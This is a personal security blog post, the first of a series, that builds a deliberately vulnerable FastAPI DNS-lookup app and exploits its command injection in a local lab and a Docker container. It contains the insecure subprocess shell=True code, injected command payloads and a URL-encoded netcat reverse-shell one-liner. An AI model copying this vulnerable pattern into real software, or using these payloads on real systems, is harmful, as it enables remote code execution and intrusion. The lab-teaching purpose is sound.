@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Making a Vulnerable Webapp | Connor Shade</title>
+<meta name="title" content="Making a Vulnerable Webapp" />
+<meta name="description" content="Make a simple webapp vulnerable to command injection to exploit later" />
+<meta name="keywords" content="python,exploit,command injection," />
+
+
+
+
+
+
+  
+  <meta property="og:title" content="Making a Vulnerable Webapp" />
+<meta property="og:description" content="Make a simple webapp vulnerable to command injection to exploit later" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://connorshade.com/service-to-shell/vulnerable-webapp/" /><meta property="article:section" content="service-to-shell" />
+<meta property="article:published_time" content="2023-07-27T21:43:58-04:00" />
+<meta property="article:modified_time" content="2023-07-27T21:43:58-04:00" />
+
+
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Making a Vulnerable Webapp"/>
+<meta name="twitter:description" content="Make a simple webapp vulnerable to command injection to exploit later"/>
+
+
+  
+  <meta itemprop="name" content="Making a Vulnerable Webapp">
+<meta itemprop="description" content="Make a simple webapp vulnerable to command injection to exploit later"><meta itemprop="datePublished" content="2023-07-27T21:43:58-04:00" />
+<meta itemprop="dateModified" content="2023-07-27T21:43:58-04:00" />
+<meta itemprop="wordCount" content="1503">
+<meta itemprop="keywords" content="python,exploit,command injection," />
+
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  
+  <link href="/style.min.css" rel="stylesheet">
+
+  
+  <link href="/syntax.min.css" rel="stylesheet">
+
+  
+
+  
+</head>
+
+<body>
+  <header><a href="/" class="title"><h1>Connor Shade</h1></a>
+<nav>
+  <a href="/">Home</a>
+
+  <a href="/author/">Author</a>
+
+  <a href="/projects/">Projects</a>
+
+  <a href="/post/">All Posts</a>
+
+  <a href="/tags/">All Tags</a>
+
+
+<a href="/index.xml">RSS</a>
+
+</nav>
+</header>
+  <main>
+<h1>Making a Vulnerable Webapp</h1>
+<i>Thu, Jul 27, 2023</i>
+<br>
+<p>Welcome to Part One in a three part series that I&rsquo;ve called &ldquo;service-to-shell&rdquo;.
+I want to make a vulnerable webapp that I can scan with a custom nmap probe and exploit with a custom Metasploit module.</p>
+<p>This post covers making the vulnerable webapp - not as exciting as a custom Metasploit module or as useful as an additional nmap banner scanner, but an essential part of the process.
+For making a vulnerable webapp, the first step is to pick the language (I went with Python), then the vulnerability (Command injection - it&rsquo;s simple to write and understand), and finally the theme.
+I&rsquo;ve done a little work on OSINT tools recently, so I thought that a simple DNS searcher API would be quick and easy.</p>
+<h2 id="writing-the-app">Writing the App</h2>
+<p>After setting up a <a href="https://github.com/cnnrshd/service-to-shell">GitHub repo</a> and cloning it locally, it&rsquo;s time to start writing the app.</p>
+<h3 id="python-dependency-management">Python dependency management</h3>
+<p>I use a virtual environment for everything I do with Python. For this project I&rsquo;m using Python 3.11 because I remember there are some changes with type hinting in 3.11 I want to use.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1"># make a virtual environment</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">python3.11 -m venv .venv_dnssearcher
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"># select the virtual environment</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nb">source</span> .venv_dnssearcher/bin/activate
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="c1"># install requirements</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">python3.11 -m pip install -r requirements.txt
+</span></span></code></pre></div><h3 id="actual-code">Actual Code</h3>
+<p>The actual code is pretty simple. We start by making a FastAPI app:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">FastAPI</span><span class="p">()</span>
+</span></span></code></pre></div><p>Add some routes for commands that might be useful - a <code>/</code> route that accepts GET requests since it&rsquo;s easy, and a <code>/dns</code> route that is susceptible to command injection:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">root</span><span class="p">():</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Working DNSSearcher&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/dns&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">dns</span><span class="p">(</span><span class="n">domainname</span> <span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="sa">f</span><span class="s2">&#34;nslookup </span><span class="si">{</span><span class="n">domainname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>And now start the webapp from the terminal, in the project root:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">uvicorn dnssearcher.main:app --reload
+</span></span></code></pre></div><h3 id="testing">Testing</h3>
+<p>Time to verify that the app actually works. We&rsquo;ll start with a basic <code>curl</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln"> 1</span><span class="cl">curl -v localhost:8000
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">*   Trying 127.0.0.1:8000...
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">* Connected to localhost <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">&gt; GET / HTTP/1.1
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">&gt; Host: localhost:8000
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">&gt; User-Agent: curl/7.81.0
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">&gt; Accept: */*
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">&gt; 
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">* Mark bundle as not supporting multiuse
+</span></span><span class="line"><span class="ln">10</span><span class="cl">&lt; HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="ln">11</span><span class="cl">&lt; date: Sat, <span class="m">29</span> Jul <span class="m">2023</span> 20:06:06 GMT
+</span></span><span class="line"><span class="ln">12</span><span class="cl">&lt; server: uvicorn
+</span></span><span class="line"><span class="ln">13</span><span class="cl">&lt; content-length: <span class="m">33</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">&lt; content-type: application/json
+</span></span><span class="line"><span class="ln">15</span><span class="cl">&lt; 
+</span></span><span class="line"><span class="ln">16</span><span class="cl">* Connection <span class="c1">#0 to host localhost left intact</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="o">{</span><span class="s2">&#34;message&#34;</span>:<span class="s2">&#34;Working DNSSearcher&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>The response is good - things are working! Time to try with some actual logic -
+this should get some kind of response with addresses:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">curl localhost:8000/dns?domainname<span class="o">=</span>google.com
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="s2">&#34;Server:\t\t10.157.0.2\nAddress:\t10.157.0.2#53\n\nNon-authoritative answer:\nName:\tgoogle.com\nAddress: 142.251.4.100\nName:\tgoogle.com\nAddress: 142.251
+</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="s2">.4.102\nName:\tgoogle.com\nAddress: 142.251.4.139\nName:\tgoogle.com\nAddress: 142.251.4.101\nName:\tgoogle.com\nAddress: 142.251.4.113\nName:\tgoogle.com\n
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="s2">Address: 142.251.4.138\nName:\tgoogle.com\nAddress: 2607:f8b0:4023:1407::64\nName:\tgoogle.com\nAddress: 2607:f8b0:4023:1407::8b\nName:\tgoogle.com\nAddress
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="s2">: 2607:f8b0:4023:1407::66\nName:\tgoogle.com\nAddress: 2607:f8b0:4023:1407::8a\n\n&#34;</span>
+</span></span></code></pre></div><p>For usability, I&rsquo;d like the newline characters to be applied. Since our response is surrounded by quotes and library we&rsquo;re working with is &ldquo;FastAPI&rdquo;, I assume that the default response type is JSON, so none of the escaped characters are being interpreted. We can fix that by using a proper Response object and setting the type to <code>text/plain</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">from</span> <span class="nn">fastapi</span> <span class="kn">import</span> <span class="n">FastAPI</span><span class="p">,</span> <span class="n">Response</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># same as before</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">dns</span><span class="p">(</span><span class="n">domainname</span> <span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="sa">f</span><span class="s2">&#34;nslookup </span><span class="si">{</span><span class="n">domainname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="n">content</span><span class="o">=</span><span class="n">ret</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">media_type</span><span class="o">=</span><span class="s2">&#34;text/plain&#34;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="p">)</span>
+</span></span></code></pre></div><p>Now, a <code>curl localhost:8000/dns?domainname=google.com</code> is returning something legible:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="ln">1</span><span class="cl">Server:         10.157.0.2
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Address:        10.157.0.2#53
+</span></span><span class="line"><span class="ln">3</span><span class="cl">
+</span></span><span class="line"><span class="ln">4</span><span class="cl">Non-authoritative answer:
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Name:   google.com
+</span></span><span class="line"><span class="ln">6</span><span class="cl">Address: 142.251.4.113
+</span></span><span class="line"><span class="ln">7</span><span class="cl">...
+</span></span></code></pre></div><h2 id="injection">Injection</h2>
+<p>The app is working - time to see if it&rsquo;s vulnerable and what exploitation looks like.</p>
+<h3 id="checking-for-command-injection">Checking for Command Injection</h3>
+<p>With the way the call to <code>subprocess.run</code> is being made, we should be able to just add a command to the end of the domainname input and get a result:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">curl localhost:8000/dns?domainname<span class="o">=</span>google.com<span class="o">&amp;&amp;</span><span class="nb">pwd</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Server:         10.157.0.2
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Address:        10.157.0.2#53
+</span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Non-authoritative answer:
+</span></span><span class="line"><span class="ln">6</span><span class="cl">Name:   google.com
+</span></span><span class="line"><span class="ln">7</span><span class="cl">Address: 142.251.4.139
+</span></span><span class="line"><span class="ln">8</span><span class="cl">...
+</span></span><span class="line"><span class="ln">9</span><span class="cl">/home/connor
+</span></span></code></pre></div><p>That&rsquo;s my working directory - I didn&rsquo;t properly escape or encode the <code>&amp;</code>. Trying again:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl">curl localhost:8000/dns?domainname<span class="o">=</span>google.com%26%26pwd
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Server:         10.157.0.2
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Address:        10.157.0.2#53
+</span></span><span class="line"><span class="ln">4</span><span class="cl">
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Non-authoritative answer:
+</span></span><span class="line"><span class="ln">6</span><span class="cl">Name:   google.com
+</span></span><span class="line"><span class="ln">7</span><span class="cl">Address: 142.251.4.101
+</span></span><span class="line"><span class="ln">8</span><span class="cl">...
+</span></span><span class="line"><span class="ln">9</span><span class="cl">/home/connor/git/dns_searcher/dnssearcher
+</span></span></code></pre></div><p>This is the directory I started the program from - the <code>pwd</code> command successfully executes, and command injection is confirmed.</p>
+<h3 id="interactive-access">Interactive Access</h3>
+<p>I&rsquo;d like interactive access (shell) since running one-off commands can be rough. My first thought is netcat.</p>
+<h4 id="nc">nc</h4>
+<p><code>nc</code> is the netcat implementation available by default on PopOS. I&rsquo;ll be using <code>nc</code> to catch and throw a shell. Catching is simple with <code>nc -lvnp 9001</code>, explanation of the options below:</p>
+<ul>
+<li><code>l</code> - listen</li>
+<li><code>v</code> - verbose, especially useful for troubleshooting failed shells</li>
+<li><code>n</code> - short for <code>--nodns</code> - does not resolve hostnames via DNS</li>
+<li><code>p</code> - sets the port number for netcat to bind to - in this case it&rsquo;s &ldquo;9001&rdquo;</li>
+</ul>
+<p>To throw a shell, I&rsquo;ll use <code>nc 127.0.0.1 9001</code>. Typically you&rsquo;d use <code>-e</code> or <code>-c</code> to execute a command that actually gets you a shell, but I want to test connectivity first.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1"># Start the app</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">./dnssearcher$ uvicorn main:app --reload
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"># Start a listener</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">nc -lvnp <span class="m">9001</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="c1"># Test a connection</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">curl localhost:8000/dns?domainname<span class="o">=</span>google.com%26%26nc%20127.0.0.1%209001
+</span></span></code></pre></div><p>Connection received! The web server doesn&rsquo;t show a response, which makes sense - the subprocess will be executing until I kill the netcat session.</p>
+<p><img src="vuln_webapp_testing_connection.png" alt="A screenshot of a tmux session showing that a netcat connection was successfully made through command injection on dnssearcher." title="A screenshot of a tmux session showing that a netcat connection was successfully made through command injection on dnssearcher."></p>
+<p>Time to test actually getting a shell through this method. I like to use <a href="https://www.revshells.com">Reverse Shell Generator</a> for this to ensure I don&rsquo;t mistype anything. The <code>nc -e</code> shell is:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="ln">1</span><span class="cl"><span class="c1"># normal</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">nc 127.0.0.1 <span class="m">9001</span> -e /bin/bash
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"># url encoded</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">nc%20127.0.0.1%209001%20-e%20%2Fbin%2Fbash
+</span></span></code></pre></div><p>Adding that onto the end of my curl command is simple:</p>
+<p><img src="vuln_webapp_returns_failed_shell.png" alt="A screenshot of a tmux session showing a curl command where I attempted to perform command injection through a GET parameter - it did not work, and my curl command returned instantly." title="A screenshot of a tmux session showing a curl command where I attempted to perform command injection through a GET parameter - it did not work, and my curl command returned instantly."></p>
+<p>The server returned a 200 instantly and there was no connection to the netcat listener. This means that the subprocess must have returned, but without reaching out to the netcat listener <em>at all</em>. Let&rsquo;s update the app with a little debugging info:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">logging</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">logger</span> <span class="o">=</span> <span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"># skip to dns</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nd">@app.get</span><span class="p">(</span><span class="s2">&#34;/dns&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="k">def</span> <span class="nf">dns</span><span class="p">(</span><span class="n">domainname</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;DNS Lookup for </span><span class="si">{</span><span class="n">domainname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="sa">f</span><span class="s2">&#34;nslookup </span><span class="si">{</span><span class="n">domainname</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="n">logger</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response status code: </span><span class="si">{</span><span class="n">ret</span><span class="o">.</span><span class="n">returncode</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">if</span> <span class="n">ret</span><span class="o">.</span><span class="n">returncode</span><span class="p">:</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="n">warn</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stderr: </span><span class="si">{</span><span class="n">ret</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="n">content</span><span class="o">=</span><span class="n">ret</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">),</span> <span class="n">media_type</span><span class="o">=</span><span class="s2">&#34;text/plain&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>I added some new debug statements to the program. Now I get notices on what the GET parameters actually look like, check the subprocess exit code, and print out the subprocess stderr field if there is a non-zero return.
+Uvicorn reloads the app and I try again:</p>
+<p><img src="./vuln_webapp_nc_invalid_option.png" alt="A screenshot showing that the additional logs are helpful - the logs show that the DNS lookup was successful, but that the command errored when running netcat with the -e option." title="A screenshot showing that the additional logs are helpful - the logs show that the DNS lookup was successful, but that the command errored when running netcat with the -e option."></p>
+<p>The additional logging told me exactly what I needed - Invalid option. I checked the man page for <code>nc</code> and found that there is no <code>-e</code> or <code>-c</code>. For those features I&rsquo;ll need <code>ncat</code>, a netcat implementation from the nmap team.</p>
+<h4 id="ncat">ncat</h4>
+<p>Installing ncat is easy - <code>sudo apt install ncat</code>. Using ncat instead of nc is equally easy, just change &ldquo;nc&rdquo; to &ldquo;ncat&rdquo; in the callback command. The fix is instant:</p>
+<p><img src="./vuln_webapp_ncat_works.png" alt="A screenshot showing a successful command injection using ncat along with a callback to a nc listener." title="A screenshot showing a successful command injection using ncat along with a callback to a nc listener."></p>
+<p>If I&rsquo;m exploiting a machine though, it is more likely the machine will have the BSD <code>nc</code> than the nmap <code>ncat</code>, so this is really just a proof of the vulnerability being exploitable in this case.</p>
+<p>I also tried the &ldquo;Python3 #2&rdquo; shell from <a href="(https://www.revshells.com/)">Revshells</a>, which got a nicish looking prompt with a working directory. In the image below, you can see the process tree starting from my tmux session - I think the chain from uvicorn -&gt; python -&gt; sh -&gt; python3 -&gt; bash is interesting.</p>
+<p><img src="process_tree.png" alt="Process tree showing uvicorn opening Python, opening an sh shell, opening Python 3, opening bash" title="Process tree showing uvicorn opening Python, opening an `sh` shell, opening Python 3, opening bash"></p>
+<h2 id="dockerize">Dockerize</h2>
+<p>I think it is more realistic to try exploiting a Dockerized Python application than a Python program running on bare metal, so I&rsquo;ve also set up a Dockerfile:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="c"># using python3.11-slim since it&#39;s popular and (i think) based on Buster</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="err"></span><span class="k">FROM</span><span class="s"> python:3.11-slim</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="err"></span><span class="c"># Make a directory /app</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err"></span><span class="k">RUN</span> mkdir /app<span class="err">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="err"></span><span class="c"># Set the working directory to /app</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="err"></span><span class="k">WORKDIR</span><span class="s"> /app</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="err"></span><span class="c"># Install required system packages (nslookup)</span><span class="err">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> apt-get install -y dnsutils<span class="err">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="err"></span><span class="c"># Copy the current directory contents into the container at /app</span><span class="err">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="err"></span><span class="k">COPY</span> ./requirements.txt /app/requirements.txt<span class="err">
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="err"></span><span class="c"># Install any needed packages specified in requirements.txt</span><span class="err">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="err"></span><span class="k">RUN</span> pip install -r /app/requirements.txt<span class="err">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="err"></span><span class="c"># Copy the app</span><span class="err">
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="err"></span><span class="k">COPY</span> ./main.py /app/main.py<span class="err">
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="err"></span><span class="c"># Expose port 8000</span><span class="err">
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="err"></span><span class="k">EXPOSE</span><span class="s"> 8000</span><span class="err">
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err"></span><span class="c"># Run main.py when the container launches</span><span class="err">
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err"></span><span class="k">CMD</span> <span class="p">[</span><span class="s2">&#34;uvicorn&#34;</span><span class="p">,</span> <span class="s2">&#34;main:app&#34;</span><span class="p">,</span> <span class="s2">&#34;--host&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s2">&#34;--port&#34;</span><span class="p">,</span> <span class="s2">&#34;8000&#34;</span><span class="p">]</span><span class="err">
+</span></span></span></code></pre></div><p>There&rsquo;s not much to talk about with this Dockerfile. One thing I&rsquo;d like to mention is: I know that my <code>main.py</code> is far more likely to change than my <code>requirements.txt</code> - I don&rsquo;t need anything more than FastAPI, but I might want to change debugging information later. Generally with a Dockerfile you want to minimize layers, so an argument could also be made to copy everything in the working directory (requirements and main.py) inside the Docker container, but this would slow test cycles every time I modify the <code>main.py</code>.</p>
+<h3 id="exploiting-the-dockerized-version">Exploiting the Dockerized version</h3>
+<p>Time to try exploiting the Dockerized version of dnssearcher. First, I&rsquo;ll try a variant of the exploit I just threw at the bare-metal version, with the only adjustment being the callback IP:</p>
+<p><img src="missing_nc_on_docker.png" alt="A screenshot of a tmux session showing a failed command injection attempt against the dnssearcher docker container. The command failed because the container does not have netcat" title="A screenshot of a tmux session showing a failed command injection attempt against the dnssearcher docker container. The command failed because the container does not have netcat"></p>
+<p><code>nc</code> is missing, and I bet <code>ncat</code> is missing too. I don&rsquo;t know if the container has <code>bash</code>, but probably not. I&rsquo;ll open a session inside the container to check:</p>
+<p><img src="programs_inside_docker.png" alt="A screenshot showing a docker command to find the name of the dnssearcher container, opening a /bin/sh shell into the container, and attempts to find which programs are available. There is a search for bash, nc, and ncat, but only bash exists." title="A screenshot showing a docker command to find the name of the dnssearcher container, opening a /bin/sh shell into the container, and attempts to find which programs are available. There is a search for bash, nc, and ncat, but only bash exists."></p>
+<p>Okay, we&rsquo;ve got bash, and I know we&rsquo;ve got Python. I&rsquo;ll use Python3 #2 from revshells:</p>
+<p><img src="successful_docker_pwn.png" alt="A screenshot showing a docker command injection to a reverse shell using Python" title="A screenshot showing a docker command injection to a reverse shell using Python"></p>
+<h2 id="wrap-up">Wrap up</h2>
+<p>There it is - making a custom Python service, ensuring it&rsquo;s vulnerable to command injection, and performing command injection on a local system and a Docker container.</p>
+
+<div style="display: flex; justify-content: space-between;">
+  
+  
+</div>
+
+  </main>
+  <footer><small>
+   | 
+</small></footer>
+
+    
+</body>
+
+</html>
